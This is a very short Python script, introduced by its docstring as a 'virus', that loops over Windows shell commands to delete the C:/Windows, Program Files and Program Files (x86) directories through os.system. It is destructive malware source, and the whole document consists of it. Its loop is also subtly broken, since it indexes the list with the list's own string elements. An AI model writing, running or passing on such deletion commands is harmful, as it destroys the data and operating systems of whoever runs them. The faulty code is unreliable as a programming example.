"""we will make a virus..."""
import os
a=['cmd /k"del C:/Windows"','cmd /k "del C:/Program Files"','cmd /k "del C:/Program Files (x86)"']
for s in a:
	os.system(a[s])